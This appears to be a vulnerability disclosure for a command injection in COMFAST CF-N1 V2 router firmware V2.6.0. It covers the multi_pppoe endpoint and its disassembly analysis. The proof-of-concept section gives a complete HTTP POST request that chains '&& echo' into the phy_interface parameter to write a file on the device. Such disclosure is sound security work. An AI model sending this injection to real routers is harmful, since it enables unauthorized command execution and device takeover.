# COMFAST CF-N1 V2 V2.6.0 Command Injection in `multi_pppoe`

Setting up the environment using tools like qemu may be difficult; it is recommended to purchase a physical device.

## Overview

A command injection vulnerability exists in the COMFAST CF-N1 V2 (firmware V2.6.0) within the `multi_pppoe` API (`/usr/bin/webmgnt`, function `sub_42FF1C`). Attackers can inject arbitrary commands via the `phy_interface` parameter when using the `one_click_redial` action, enabling unauthorized execution of system commands, access to sensitive information, or full compromise of the device.



![PoC Result: Command Execution Proof](./imgs/0.png)

## Details



*   **Vendor**: COMFAST

*   **Vendor Website**: [http://www.comfast.cn/](http://www.comfast.cn/)

*   **Product**: COMFAST CF-N1 V2

*   **Firmware**: V2.6.0

*   **Firmware Download**: [http://www.comfast.com.cn/index.php?m=content\&c=index\&a=show\&catid=31\&id=772](http://www.comfast.com.cn/index.php?m=content\&c=index\&a=show\&catid=31\&id=772)

*   **Endpoint**: `/cgi-bin/mbox-config?method=SET&section=multi_pppoe`

*   **Vulnerability**: Command Injection

*   **CVE ID**: Pending

*   **Impact**: Execute arbitrary system commands, read sensitive files, or take full control of the device.

*   **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)

### Description

The vulnerability originates in the `sub_42FF1C` function handling the `multi_pppoe` configuration. Disassembly analysis shows that the `phy_interface` parameter is unsanitized and directly incorporated into system commands via `sprintf_0` when the `action` is set to `one_click_redial`.

Key code flow:



1.  User input (including `phy_interface`) is parsed via `blobmsg_parse_0` and extracted as a configuration parameter.

2.  When `action` is `one_click_redial`, the `phy_interface` value is inserted into a command string using `sprintf_0` (e.g., constructing `ifdown %s; ifup %s` or similar network interface commands).

3.  The constructed command is executed via `system_0` without input sanitization, allowing injection of arbitrary commands through delimiters like `&&`, `;`, or `|`.

This direct concatenation of unvalidated input into executable commands enables attackers to break out of the intended command context and execute malicious code.



![Disassembly Snippet: Vulnerable Code Path](./imgs/1.png)



![Command Construction Flow](./imgs/2.png)

## Proof of Concept (PoC)

### PoC: Inject Command to Write Test File



```
POST http://192.168.0.1/cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
Host: cflogin.cn
Content-Length: 105
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Content-Type: appliation/json
Origin: http://cflogin.cn
Referer: http://cflogin.cn/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: COMFAST_SESSIONID=6501a8c0-ffffffc40f08ffffffaaffffff82fffffff0-2c28fa16
Connection: close

{"action":"one_click_redial","phy_interface":"br-wan && echo pppoe > /www-comfast/test.txt","real_num":1}
```



*   **Notes**: The vulnerable parameter is `phy_interface`, exploited using `&&` to chain an additional command.

*   **Steps**:

1.  Send the POST request using tools like Burp Suite or `curl`.

2.  Access `http://cflogin.cn/test.txt` to verify command execution.

*   **Result**: The file `/www-comfast/test.txt` is created with the content "pppoe", confirming successful injection.



![PoC Execution Result](./imgs/3.png)
